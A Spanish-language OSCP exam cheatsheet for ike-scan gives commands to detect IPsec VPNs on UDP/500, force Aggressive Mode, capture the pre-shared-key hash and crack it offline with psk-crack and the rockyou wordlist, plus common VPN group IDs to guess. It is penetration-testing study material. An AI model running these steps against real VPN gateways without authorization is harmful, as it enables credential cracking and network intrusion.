# ike-scan — Cheatsheet OSCP

## Cuándo usar ike-scan
- UDP/500 abierto o sospechoso
- No hay servicios TCP claros
- Objetivo corporativo / VPN
- Enumeración UDP en OSCP / HTB

---

## Comandos esenciales

### 1. Detectar VPN IPsec
```bash
ike-scan IP
```
**Buscar en salida**
```
Main Mode Handshake returned
```
✔ Existe VPN

---

### 2. Forzar Aggressive Mode
```bash
ike-scan -A IP
```
**Buscar**
```
Aggressive Mode Handshake returned

ike-scan -A --pskcrack=psk.txt <IP>

```

✔ PSK potencialmente crackeable


---

### 3. Fingerprint del fabricante
```bash
ike-scan -M IP
```
**Buscar**
```
Vendor ID: Cisco
Vendor ID: strongSwan
```

---

### 4. Capturar hash PSK (objetivo real)
```bash
ike-scan -A -M --id=vpn IP > ike.txt
```
**Buscar SOLO esto**
```
Auth=PSK
Hash: 0x...
```

---

### 5. Crackear PSK
```bash
psk-crack -d /usr/share/wordlists/rockyou.txt ike.txt
```
**Buscar**
```
The PSK is "password123"
```

---

## Banderas importantes

| Bandera | Función |
|------|------|
| `-A` | Aggressive Mode |
| `-M` | Vendor ID |
| `--id` | Grupo VPN |
| `-d` | Diccionario (psk-crack) |

---

## IDs VPN comunes
```text
vpn
corp
office
default
remote
```

---

## Qué ignorar
- Texto largo
- Headers
- Estadísticas

---

## Qué buscar siempre
- `Aggressive Mode Handshake returned`
- `Auth=PSK`
- `Hash:`

---

## Flujo mental OSCP
```text
UDP/500 →
ike-scan →
-A →
Hash →
psk-crack →
acceso
```

---

## Errores que suspenden
- No probar UDP
- Ver UDP/500 y no usar ike-scan
- No usar Aggressive Mode
- No crackear offline

---

## Frase para memorizar
> Aggressive Mode = PSK crackeable